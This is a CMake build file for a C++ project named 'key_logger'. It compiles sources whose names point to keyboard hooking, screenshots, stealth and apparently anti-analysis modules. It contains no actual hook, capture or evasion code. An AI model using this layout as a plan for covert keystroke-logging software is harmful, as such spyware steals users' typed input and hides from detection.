# CMakeList.txt : CMake project for key_logger, include source and define
# project specific logic here.
#
cmake_minimum_required (VERSION 3.8)

# Enable Hot Reload for MSVC compilers if supported.
if (POLICY CMP0141)
  cmake_policy(SET CMP0141 NEW)
  set(CMAKE_MSVC_DEBUG_INFORMATION_FORMAT "$<IF:$<AND:$<C_COMPILER_ID:MSVC>,$<CXX_COMPILER_ID:MSVC>>,$<$<CONFIG:Debug,RelWithDebInfo>:EditAndContinue>,$<$<CONFIG:Debug,RelWithDebInfo>:ProgramDatabase>>")
endif()

project ("key_logger")

# Add source to this project's executable.
add_executable (key_logger  "src/main.cpp"
        "include/key_hook.h"
        "include/key_constants.h"
        "include/Screenshot.h"
        "include/Stealth.h"
        "include/anti_eyes.h"
        "src/Stealth.cpp"
        "src/anti_eyes.cpp"
        "src/key_hook.cpp"
        "include/memory.h"
        src/memory.cpp)

if (CMAKE_VERSION VERSION_GREATER 3.12)
  set_property(TARGET key_logger PROPERTY CXX_STANDARD 20)
endif()

# TODO: Add tests and install targets if needed.
